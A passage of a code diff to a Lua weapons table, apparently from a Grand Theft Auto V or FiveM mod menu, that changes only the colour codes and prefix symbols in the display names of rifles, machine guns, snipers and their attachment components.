                         id = 'COMPONENT_AT_AR_SUPP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Flat Muzzle Brake',
+                        name = '~h~~p~» ~s~Flat Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
+                        name = '~h~~p~» ~s~Tactical Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Fat-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Precision Muzzle Brake',
+                        name = '~h~~p~» ~s~Precision Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_04'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
+                        name = '~h~~p~» ~s~Heavy Duty Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_05'
                     },
                     {
-                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
+                        name = '~h~~p~» ~s~Slanted Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_06'
                     },
                     {
-                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Split-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_07'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP_02'
                     }
                 }
@@ -2689,44 +2697,44 @@ local b7 = {
         },
         CarbineRifle = {
             id = 'weapon_carbinerifle',
-            name = '~h~~r~> ~s~Carbine Rifle',
+            name = '~h~~p~» ~s~Carbine Rifle',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_CARBINERIFLE_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_CARBINERIFLE_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Box Magazine',
+                        name = '~h~~p~» ~s~Box Magazine',
                         id = 'COMPONENT_CARBINERIFLE_CLIP_03'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_MEDIUM'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -2734,102 +2742,102 @@ local b7 = {
         },
         CarbineRifleMkII = {
             id = 'weapon_carbinerifle_mk2',
-            name = '~h~~r~> ~s~Carbine Rifle Mk II ',
+            name = '~h~~p~» ~s~Carbine Rifle Mk II ',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS'
                     },
                     {
-                        name = '~h~~r~> ~s~Small Scope',
+                        name = '~h~~p~» ~s~Small Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Large Scope',
+                        name = '~h~~p~» ~s~Large Scope',
                         id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 Barrel = {
                     {
-                        name = '~h~~r~> ~s~Default',
+                        name = '~h~~p~» ~s~Default',
                         id = 'COMPONENT_AT_CR_BARREL_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy',
+                        name = '~h~~p~» ~s~Heavy',
                         id = 'COMPONENT_AT_CR_BARREL_02'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP'
                     },
                     {
-                        name = '~h~~r~> ~s~Flat Muzzle Brake',
+                        name = '~h~~p~» ~s~Flat Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
+                        name = '~h~~p~» ~s~Tactical Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Fat-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Precision Muzzle Brake',
+                        name = '~h~~p~» ~s~Precision Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_04'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
+                        name = '~h~~p~» ~s~Heavy Duty Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_05'
                     },
                     {
-                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
+                        name = '~h~~p~» ~s~Slanted Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_06'
                     },
                     {
-                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Split-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_07'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP_02'
                     }
                 }
@@ -2837,34 +2845,34 @@ local b7 = {
         },
         AdvancedRifle = {
             id = 'weapon_advancedrifle',
-            name = '~h~~r~> ~s~Advanced Rifle ',
+            name = '~h~~p~» ~s~Advanced Rifle ',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_ADVANCEDRIFLE_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_ADVANCEDRIFLE_CLIP_02'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_SMALL'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP'
                     }
                 }
@@ -2872,44 +2880,44 @@ local b7 = {
         },
         SpecialCarbine = {
             id = 'weapon_specialcarbine',
-            name = '~h~~r~> ~s~Special Carbine',
+            name = '~h~~p~» ~s~Special Carbine',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_SPECIALCARBINE_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_SPECIALCARBINE_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Drum Magazine',
+                        name = '~h~~p~» ~s~Drum Magazine',
                         id = 'COMPONENT_SPECIALCARBINE_CLIP_03'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_MEDIUM'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP_02'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -2917,102 +2925,102 @@ local b7 = {
         },
         SpecialCarbineMkII = {
             id = 'weapon_specialcarbine_mk2',
-            name = '~h~~r~> ~s~Special Carbine Mk II',
+            name = '~h~~p~» ~s~Special Carbine Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS'
                     },
                     {
-                        name = '~h~~r~> ~s~Small Scope',
+                        name = '~h~~p~» ~s~Small Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Large Scope',
+                        name = '~h~~p~» ~s~Large Scope',
                         id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 Barrel = {
                     {
-                        name = '~h~~r~> ~s~Default',
+                        name = '~h~~p~» ~s~Default',
                         id = 'COMPONENT_AT_SC_BARREL_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy',
+                        name = '~h~~p~» ~s~Heavy',
                         id = 'COMPONENT_AT_SC_BARREL_02'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Flat Muzzle Brake',
+                        name = '~h~~p~» ~s~Flat Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
+                        name = '~h~~p~» ~s~Tactical Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Fat-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Precision Muzzle Brake',
+                        name = '~h~~p~» ~s~Precision Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_04'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
+                        name = '~h~~p~» ~s~Heavy Duty Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_05'
                     },
                     {
-                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
+                        name = '~h~~p~» ~s~Slanted Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_06'
                     },
                     {
-                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Split-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_07'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP_02'
                     }
                 }
@@ -3020,40 +3028,40 @@ local b7 = {
         },
         BullpupRifle = {
             id = 'weapon_bullpuprifle',
-            name = '~h~~r~> ~s~Bullpup Rifle',
+            name = '~h~~p~» ~s~Bullpup Rifle',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_BULLPUPRIFLE_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_BULLPUPRIFLE_CLIP_02'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_SMALL'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -3061,102 +3069,102 @@ local b7 = {
         },
         BullpupRifleMkII = {
             id = 'weapon_bullpuprifle_mk2',
-            name = '~h~~r~> ~s~Bullpup Rifle Mk II',
+            name = '~h~~p~» ~s~Bullpup Rifle Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Armor Piercing Rounds',
+                        name = '~h~~p~» ~s~Armor Piercing Rounds',
                         id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS'
                     },
                     {
-                        name = '~h~~r~> ~s~Small Scope',
+                        name = '~h~~p~» ~s~Small Scope',
                         id = 'COMPONENT_AT_SCOPE_MACRO_02_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Medium Scope',
+                        name = '~h~~p~» ~s~Medium Scope',
                         id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                     }
                 },
                 Flashlight = {
                     {
-                        name = '~h~~r~> ~s~Flashlight',
+                        name = '~h~~p~» ~s~Flashlight',
                         id = 'COMPONENT_AT_AR_FLSH'
                     }
                 },
                 Barrel = {
                     {
-                        name = '~h~~r~> ~s~Default',
+                        name = '~h~~p~» ~s~Default',
                         id = 'COMPONENT_AT_BP_BARREL_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy',
+                        name = '~h~~p~» ~s~Heavy',
                         id = 'COMPONENT_AT_BP_BARREL_02'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP'
                     },
                     {
-                        name = '~h~~r~> ~s~Flat Muzzle Brake',
+                        name = '~h~~p~» ~s~Flat Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
+                        name = '~h~~p~» ~s~Tactical Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Fat-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Precision Muzzle Brake',
+                        name = '~h~~p~» ~s~Precision Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_04'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
+                        name = '~h~~p~» ~s~Heavy Duty Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_05'
                     },
                     {
-                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
+                        name = '~h~~p~» ~s~Slanted Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_06'
                     },
                     {
-                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Split-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_07'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -3164,20 +3172,20 @@ local b7 = {
         },
         CompactRifle = {
             id = 'weapon_compactrifle',
-            name = '~h~~r~> ~s~Compact Rifle',
+            name = '~h~~p~» ~s~Compact Rifle',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_COMPACTRIFLE_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_COMPACTRIFLE_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Drum Magazine',
+                        name = '~h~~p~» ~s~Drum Magazine',
                         id = 'COMPONENT_COMPACTRIFLE_CLIP_03'
                     }
                 }
@@ -3187,22 +3195,22 @@ local b7 = {
     LMG = {
         MG = {
             id = 'weapon_mg',
-            name = '~h~~r~> ~s~MG',
+            name = '~h~~p~» ~s~MG',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_MG_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_MG_CLIP_02'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_SMALL_02'
                     }
                 }
@@ -3210,28 +3218,28 @@ local b7 = {
         },
         CombatMG = {
             id = 'weapon_combatmg',
-            name = '~h~~r~> ~s~Combat MG',
+            name = '~h~~p~» ~s~Combat MG',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_COMBATMG_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_COMBATMG_CLIP_02'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_MEDIUM'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP'
                     }
                 }
@@ -3239,92 +3247,92 @@ local b7 = {
         },
         CombatMGMkII = {
             id = 'weapon_combatmg_mk2',
-            name = '~h~~r~> ~s~Combat MG Mk II',
+            name = '~h~~p~» ~s~Combat MG Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_COMBATMG_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_COMBATMG_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Tracer Rounds',
+                        name = '~h~~p~» ~s~Tracer Rounds',
                         id = 'COMPONENT_COMBATMG_MK2_CLIP_TRACER'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Hollow Point Rounds',
+                        name = '~h~~p~» ~s~Hollow Point Rounds',
                         id = 'COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'
                     },
                     {
-                        name = '~h~~r~> ~s~FMJ Rounds',
+                        name = '~h~~p~» ~s~FMJ Rounds',
                         id = 'COMPONENT_COMBATMG_MK2_CLIP_FMJ'
                     }
                 },
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Holograhpic Sight',
+                        name = '~h~~p~» ~s~Holograhpic Sight',
                         id = 'COMPONENT_AT_SIGHTS'
                     },
                     {
-                        name = '~h~~r~> ~s~Medium Scope',
+                        name = '~h~~p~» ~s~Medium Scope',
                         id = 'COMPONENT_AT_SCOPE_SMALL_MK2'
                     },
                     {
-                        name = '~h~~r~> ~s~Large Scope',
+                        name = '~h~~p~» ~s~Large Scope',
                         id = 'COMPONENT_AT_SCOPE_MEDIUM_MK2'
                     }
                 },
                 Barrel = {
                     {
-                        name = '~h~~r~> ~s~Default',
+                        name = '~h~~p~» ~s~Default',
                         id = 'COMPONENT_AT_MG_BARREL_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy',
+                        name = '~h~~p~» ~s~Heavy',
                         id = 'COMPONENT_AT_MG_BARREL_02'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Flat Muzzle Brake',
+                        name = '~h~~p~» ~s~Flat Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Tactical Muzzle Brake',
+                        name = '~h~~p~» ~s~Tactical Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Fat-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Fat-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_03'
                     },
                     {
-                        name = '~h~~r~> ~s~Precision Muzzle Brake',
+                        name = '~h~~p~» ~s~Precision Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_04'
                     },
                     {
-                        name = '~h~~r~> ~s~Heavy Duty Muzzle Brake',
+                        name = '~h~~p~» ~s~Heavy Duty Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_05'
                     },
                     {
-                        name = '~h~~r~> ~s~Slanted Muzzle Brake',
+                        name = '~h~~p~» ~s~Slanted Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_06'
                     },
                     {
-                        name = '~h~~r~> ~s~Split-End Muzzle Brake',
+                        name = '~h~~p~» ~s~Split-End Muzzle Brake',
                         id = 'COMPONENT_AT_MUZZLE_07'
                     }
                 },
                 Grips = {
                     {
-                        name = '~h~~r~> ~s~Grip',
+                        name = '~h~~p~» ~s~Grip',
                         id = 'COMPONENT_AT_AR_AFGRIP_02'
                     }
                 }
@@ -3332,16 +3340,16 @@ local b7 = {
         },
         GusenbergSweeper = {
             id = 'weapon_gusenberg',
-            name = '~h~~r~> ~s~GusenbergSweeper',
+            name = '~h~~p~» ~s~GusenbergSweeper',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_GUSENBERG_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_GUSENBERG_CLIP_02'
                     }
                 }
@@ -3351,22 +3359,22 @@ local b7 = {
     Snipers = {
         SniperRifle = {
             id = 'weapon_sniperrifle',
-            name = '~h~~r~> ~s~Sniper Rifle',
+            name = '~h~~p~» ~s~Sniper Rifle',
             bInfAmmo = false,
             mods = {
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_LARGE'
                     },
                     {
-                        name = '~h~~r~> ~s~Advanced Scope',
+                        name = '~h~~p~» ~s~Advanced Scope',
                         id = 'COMPONENT_AT_SCOPE_MAX'
                     }
                 },
                 BarrelAttachments = {
                     {
-                        name = '~h~~r~> ~s~Suppressor',
+                        name = '~h~~p~» ~s~Suppressor',
                         id = 'COMPONENT_AT_AR_SUPP_02'
                     }
                 }
@@ -3374,16 +3382,16 @@ local b7 = {
         },
         HeavySniper = {
             id = 'weapon_heavysniper',
-            name = '~h~~r~> ~s~Heavy Sniper',
+            name = '~h~~p~» ~s~Heavy Sniper',
             bInfAmmo = false,
             mods = {
                 Sights = {
                     {
-                        name = '~h~~r~> ~s~Scope',
+                        name = '~h~~p~» ~s~Scope',
                         id = 'COMPONENT_AT_SCOPE_LARGE'
                     },
                     {
-                        name = '~h~~r~> ~s~Advanced Scope',
+                        name = '~h~~p~» ~s~Advanced Scope',
                         id = 'COMPONENT_AT_SCOPE_MAX'
                     }
                 }
@@ -3391,74 +3399,74 @@ local b7 = {
         },
         HeavySniperMkII = {
             id = 'weapon_heavysniper_mk2',
-            name = '~h~~r~> ~s~Heavy Sniper Mk II',
+            name = '~h~~p~» ~s~Heavy Sniper Mk II',
             bInfAmmo = false,
             mods = {
                 Magazines = {
                     {
-                        name = '~h~~r~> ~s~Default Magazine',
+                        name = '~h~~p~» ~s~Default Magazine',
                         id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_01'
                     },
                     {
-                        name = '~h~~r~> ~s~Extended Magazine',
+                        name = '~h~~p~» ~s~Extended Magazine',
                         id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_02'
                     },
                     {
-                        name = '~h~~r~> ~s~Incendiary Rounds',
+                        name = '~h~~p~» ~s~Incendiary Rounds',
                         id = 'COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'
                     },
                     {
-                        name = '~h~~r~> ~s~Armor Piercing Rounds',
